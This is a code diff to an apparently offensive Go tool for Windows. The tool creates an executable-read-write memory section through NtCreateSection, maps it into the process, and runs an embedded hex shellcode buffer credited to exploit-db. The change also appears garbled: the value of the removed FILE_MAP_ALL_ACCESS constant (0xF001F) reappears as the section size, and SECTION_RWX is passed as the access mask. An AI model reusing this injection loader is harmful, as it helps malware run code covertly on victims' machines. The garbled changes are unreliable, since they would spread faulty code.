@@ -54,9 +54,8 @@ const SECTION_WRITE = 0x2
 const SECTION_READ = 0x4
 const SECTION_EXECUTE = 0x8
 const SECTION_RWX = SECTION_WRITE | SECTION_READ | SECTION_EXECUTE
-const FILE_MAP_ALL_ACCESS = 0xF001F
 
-func CreateNewSection(ntdll syscall.Handle, size int64) (uintptr, error) {
+func CreateNewSection(ntdll syscall.Handle) (uintptr, error) {
 	var err error
 	NtCreateSection, err := syscall.GetProcAddress(
 		syscall.Handle(ntdll), "NtCreateSection")
@@ -64,10 +63,11 @@ func CreateNewSection(ntdll syscall.Handle, size int64) (uintptr, error) {
 		return 0, err
 	}
 	var section uintptr
+	size := int64(0xF001F)
 	r, a, err := syscall.Syscall9(uintptr(NtCreateSection),
 		7,
 		uintptr(unsafe.Pointer(&section)), // PHANDLE            SectionHandle,
-		FILE_MAP_ALL_ACCESS,               // ACCESS_MASK        DesiredAccess,
+		SECTION_RWX,                       // ACCESS_MASK        DesiredAccess,
 		0,                                 // POBJECT_ATTRIBUTES ObjectAttributes,
 		uintptr(unsafe.Pointer(&size)),    // PLARGE_INTEGER     MaximumSize,
 		windows.PAGE_EXECUTE_READWRITE,    // ULONG              SectionPageProtection,
@@ -295,6 +295,11 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
+	section, err := CreateNewSection(ntdll)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
 	var testSize uint32 = 512
 	//testBuff := []byte("HELLO WORLD!")
 	// REF: https://www.exploit-db.com/exploits/28996
@@ -306,11 +311,6 @@ func main() {
 		"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x6f\x72" +
 		"\x6e\x01\x68\x55\x6e\x69\x63\x68\x20\x4d\x61\x6c\x89\xe1\xfe" +
 		"\x49\x0b\x31\xc0\x51\x50\xff\xd7")
-	
-	section, err := CreateNewSection(ntdll, testSize)
-	if err != nil {
-		log.Fatalln(err)
-	}
 	// Local map section
 	curHandle := uintptr(windows.CurrentProcess())
 	localBaseAddr, _, err := MapViewOfSection(ntdll, section, curHandle, testSize, 0)
